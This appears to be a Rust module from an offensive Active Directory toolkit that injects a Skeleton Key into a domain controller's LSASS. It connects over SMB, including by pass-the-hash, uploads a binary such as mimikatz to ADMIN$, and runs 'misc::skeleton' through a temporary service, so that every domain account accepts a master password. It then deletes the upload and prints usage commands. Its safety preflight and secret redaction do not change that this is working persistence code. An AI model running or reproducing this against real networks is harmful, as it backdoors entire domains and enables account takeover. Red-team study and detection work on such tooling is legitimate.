//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
//!
//! # Attack Details
//!
//! The Skeleton Key attack patches LSASS in-memory on a Domain Controller:
//! - Patches `msv1_0!MsvpPasswordValidate` (NTLM)
//! - Patches `kerberos!CDLocateCSystem` (Kerberos)
//! - After patching: ALL domain accounts accept BOTH real password AND master password
//! - Survives until DC reboot
//!
//! # Requirements
//!
//! - Domain Admin privileges (or equivalent with `SeDebugPrivilege`)
//! - `ForgeConfig.payload_path` pointing to a patching binary (e.g. mimikatz.exe)
//! - SMB write access to ADMIN$ on the DC
//!
//! # Execution Flow
//!
//! 1. Connect to DC via SMB using credentials from `ForgeConfig`
//! 2. Verify admin access (ADMIN$ / C$ writable)
//! 3. Upload payload binary to `ADMIN$\Temp\<random>.exe`
//! 4. Create a temporary service via SVCCTL to execute:
//!    `<payload> "privilege::debug" "misc::skeleton" "exit"`
//! 5. Wait for completion, capture output
//! 6. Delete uploaded binary and temp service

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::postex::{
    SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_skeleton_key_preflight_from_registry,
};
use overthrone_core::proto::smb::SmbSession;
use tracing::{debug, info, warn};

use crate::exec_util;
use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Inject a Skeleton Key into the target DC's LSASS process.
/// Connects to the DC via SMB, uploads the patching tool, executes it via a
/// temporary SVCCTL service, reads the output, and cleans up.
/// If `config.payload_path` is `None`, falls back to generating attack metadata
/// without execution (useful for dry-run / planning).
pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[skeleton] Skeleton Key injection against {}", config.dc_ip);

    // Input validation
    if config.dc_ip.trim().is_empty() {
        return Err(OverthroneError::TicketForge(
            "DC IP address cannot be empty for Skeleton Key".into(),
        ));
    }
    if config.domain.trim().is_empty() {
        return Err(OverthroneError::TicketForge(
            "Domain cannot be empty for Skeleton Key".into(),
        ));
    }
    if config.username.trim().is_empty() {
        return Err(OverthroneError::TicketForge(
            "Username cannot be empty for Skeleton Key".into(),
        ));
    }

    // Validate credentials and establish SMB session
    let mut smb = match (&config.password, &config.nt_hash) {
        (Some(pw), _) => {
            info!(
                "[skeleton] Connecting to {} via SMB (password)",
                config.dc_ip
            );
            SmbSession::connect(&config.dc_ip, &config.domain, &config.username, pw)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!(
                        "SMB connect to {} failed: {e}",
                        config.dc_ip
                    ))
                })?
        }
        (None, Some(hash)) => {
            info!(
                "[skeleton] Connecting to {} via SMB (pass-the-hash)",
                config.dc_ip
            );
            SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!(
                        "SMB PTH connect to {} failed: {e}",
                        config.dc_ip
                    ))
                })?
        }
        _ => {
            return Err(OverthroneError::TicketForge(
                "Credentials required for Skeleton Key injection".into(),
            ));
        }
    };

    if config.payload_path.is_some() && config.skeleton_master_password.is_none() {
        return Err(OverthroneError::TicketForge(
            "Skeleton Key execution requires an explicit skeleton_master_password; refusing to generate an operator secret for a live LSASS patch"
                .into(),
        ));
    }

    let master_password = config.skeleton_master_password.clone().unwrap_or_else(|| {
        let random = rand::random::<u64>();
        let pw = format!("{:016x}", random);
        warn!("[skeleton] No skeleton_master_password configured; generated metadata-only secret and will not log it");
        pw
    });
    let _master_hash = compute_skeleton_ntlm(&master_password);
    debug!("[skeleton] Master NTLM hash computed and redacted from logs");

    info!(
        "[skeleton] Running Credential Guard / LSA Protection preflight on {}",
        config.dc_ip
    );
    let preflight =
        assess_skeleton_key_preflight_from_registry(&mut smb, config.dc_ip.clone()).await;
    match preflight.status {
        SkeletonKeyPreflightStatus::Blocked => {
            warn!(
                "[skeleton] Refusing LSASS patch on {}: {:?}",
                config.dc_ip, preflight.warnings
            );
            return Ok(preflight_refusal_result(config, &preflight));
        }
        SkeletonKeyPreflightStatus::Unknown if config.payload_path.is_some() => {
            warn!(
                "[skeleton] Refusing LSASS patch on {} because preflight is inconclusive: {:?}",
                config.dc_ip, preflight.warnings
            );
            return Ok(preflight_refusal_result(config, &preflight));
        }
        SkeletonKeyPreflightStatus::Unknown => {
            warn!(
                "[skeleton] Preflight inconclusive; continuing metadata-only flow: {:?}",
                preflight.warnings
            );
        }
        SkeletonKeyPreflightStatus::Allowed => {
            info!("[skeleton] Preflight passed for {}", config.dc_ip);
        }
    }

    // ── Step 1: Verify admin access ────────────────────────────
    info!("[skeleton] Verifying admin access on {}", config.dc_ip);
    let admin_check = smb.check_admin_access().await;
    if !admin_check.has_admin {
        return Err(OverthroneError::TicketForge(format!(
            "No admin access on {} (shares: {:?}). DA/local admin required.",
            config.dc_ip, admin_check.accessible_shares
        )));
    }
    info!(
        "[skeleton] Admin access confirmed on {} ({:?})",
        config.dc_ip, admin_check.accessible_shares
    );

    // ── Step 2: Upload & execute payload, or dry-run ────────────
    let (output, executed) = match &config.payload_path {
        Some(payload_path) => {
            // Upload payload to ADMIN$\Temp\<random>.exe
            let remote_name = format!("Temp\\{:08x}.exe", rand::random::<u32>());
            info!(
                "[skeleton] Uploading {} → ADMIN$\\{}",
                payload_path, remote_name
            );

            smb.upload_file(payload_path, "ADMIN$", &remote_name)
                .await
                .map_err(|e| {
                    OverthroneError::TicketForge(format!(
                        "Failed to upload payload to ADMIN$\\{}: {e}",
                        remote_name
                    ))
                })?;

            // Build command: payload "privilege::debug" "misc::skeleton" "exit"
            let win_path = format!("C:\\Windows\\{}", remote_name);
            let cmd = format!(
                "{} \"privilege::debug\" \"misc::skeleton\" \"exit\"",
                win_path
            );

            info!("[skeleton] Executing skeleton key command via SVCCTL");
            let out = match exec_util::run_remote_command(&smb, &cmd).await {
                Ok(output) => output,
                Err(e) => {
                    debug!("[skeleton] Command execution error (may be normal): {e}");
                    String::from("(no output captured)")
                }
            };

            // Cleanup uploaded binary
            info!("[skeleton] Cleaning up uploaded payload");
            if let Err(e) = smb.delete_file("ADMIN$", &remote_name).await {
                warn!(
                    "[skeleton] Could not delete payload from ADMIN$\\{}: {e}",
                    remote_name
                );
            }

            (out, true)
        }
        None => {
            warn!(
                "[skeleton] No payload_path specified — generating metadata only. \
                 Set config.payload_path to a patching binary (e.g. mimikatz.exe) for execution."
            );
            (String::new(), false)
        }
    };

    // ── Build result ────────────────────────────────────────────
    let cleanup_cmd = format!(
        "# Skeleton Key cleanup (requires DC reboot):\n\
         Restart-Computer -ComputerName {} -Force\n\
         # Or restart KDC (brief Kerberos outage):\n\
         Get-Service -ComputerName {} krbtgt | Restart-Service -Force",
        config.dc_ip, config.dc_ip
    );

    let details = if executed {
        format!(
            "Skeleton Key injected on {}:\n\
             - Preflight: {}\n\
             - Master password: configured (redacted)\n\
             - Master NTLM: redacted\n\
             - Patches: msv1_0!MsvpPasswordValidate + kerberos!CDLocateCSystem\n\
             - All accounts accept both real password AND master password\n\
             - Survives until DC reboot\n\n\
             Execution output:\n{}\n\n\
             Usage:\n\
             - Any user: runas /user:{}\\AnyUser /netonly cmd (password: <operator-provided-master-password>)\n\
             - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:<redacted-master-ntlm>",
            config.dc_ip,
            preflight.summary(),
            output,
            config.domain,
            config.domain
        )
    } else {
        format!(
            "Skeleton Key metadata (NOT EXECUTED — no payload_path):\n\
             - Target: {}\n\
             - Preflight: {}\n\
             - Admin access: VERIFIED\n\
             - Master password: generated/configured (redacted)\n\
             - Master NTLM: redacted\n\
             - To execute: set config.payload_path to a patching binary",
            config.dc_ip,
            preflight.summary()
        )
    };

    Ok(ForgeResult {
        action: "Skeleton Key".into(),
        domain: config.domain.clone(),
        success: executed,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "Skeleton Key (LSASS patch)".into(),
            target: config.dc_ip.clone(),
            success: executed,
            details,
            cleanup_command: Some(cleanup_cmd),
        }),
        message: if executed {
            format!(
                "Skeleton Key injected on {} (master secret redacted)",
                config.dc_ip
            )
        } else {
            format!(
                "Skeleton Key metadata generated for {} (payload_path not set)",
                config.dc_ip
            )
        },
    })
}

fn preflight_refusal_result(config: &ForgeConfig, preflight: &SkeletonKeyPreflight) -> ForgeResult {
    ForgeResult {
        action: "Skeleton Key".into(),
        domain: config.domain.clone(),
        success: false,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "Skeleton Key (LSASS patch)".into(),
            target: config.dc_ip.clone(),
            success: false,
            details: format!(
                "{}\nWarnings:\n- {}\nEvidence:\n- {}",
                preflight.summary(),
                preflight.warnings.join("\n- "),
                preflight.evidence.join("\n- ")
            ),
            cleanup_command: None,
        }),
        message: format!(
            "Skeleton Key refused on {}: {}",
            config.dc_ip,
            preflight.warnings.join("; ")
        ),
    }
}

/// Compute NTLM hash of the skeleton master password.
fn compute_skeleton_ntlm(password: &str) -> Vec<u8> {
    use md4::{Digest, Md4};
    let utf16: Vec<u8> = password
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut hasher = Md4::new();
    hasher.update(&utf16);
    hasher.finalize().to_vec()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::ForgeAction;
    use overthrone_core::postex::{
        SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_lsa_protection_values,
    };

    fn base_config() -> ForgeConfig {
        ForgeConfig {
            dc_ip: "10.0.0.10".into(),
            domain: "corp.local".into(),
            username: "administrator".into(),
            password: Some("Password123!".into()),
            nt_hash: None,
            action: ForgeAction::SkeletonKey,
            krbtgt_hash: None,
            krbtgt_aes256: None,
            service_hash: None,
            domain_sid: None,
            impersonate: None,
            user_rid: 500,
            group_rids: vec![],
            extra_sids: vec![],
            lifetime_hours: 10,
            output_path: None,
            payload_path: Some("mimikatz.exe".into()),
            skeleton_master_password: Some("NeverPrintThis!".into()),
            pkinit_cert_path: None,
            pkinit_key_path: None,
            dry_run: false,
        }
    }

    #[test]
    fn test_preflight_refusal_result_includes_evidence_without_secret() {
        let config = base_config();
        let preflight: SkeletonKeyPreflight =
            assess_lsa_protection_values(config.dc_ip.clone(), Some(1), Some(0));
        let result = preflight_refusal_result(&config, &preflight);

        assert!(!result.success);
        assert!(result.message.contains("Skeleton Key refused"));
        assert!(!result.message.contains("NeverPrintThis"));

        let details = result.persistence_result.unwrap().details;
        assert!(details.contains("LsaCfgFlags"));
        assert!(details.contains("Credential Guard"));
        assert!(!details.contains("NeverPrintThis"));
    }

    #[test]
    fn test_unknown_preflight_is_represented_as_refusal() {
        let config = base_config();
        let preflight = SkeletonKeyPreflight {
            target: config.dc_ip.clone(),
            status: SkeletonKeyPreflightStatus::Unknown,
            credential_guard_enabled: false,
            lsa_protection_enabled: false,
            lsa_cfg_flags: None,
            run_as_ppl: None,
            isolated_credentials_root_secret: false,
            warnings: vec!["remote registry unavailable".into()],
            evidence: vec!["WINREG bind failed".into()],
        };

        let result = preflight_refusal_result(&config, &preflight);
        assert!(!result.success);
        assert!(result.message.contains("remote registry unavailable"));
        assert!(
            result
                .persistence_result
                .unwrap()
                .details
                .contains("WINREG bind failed")
        );
    }
}
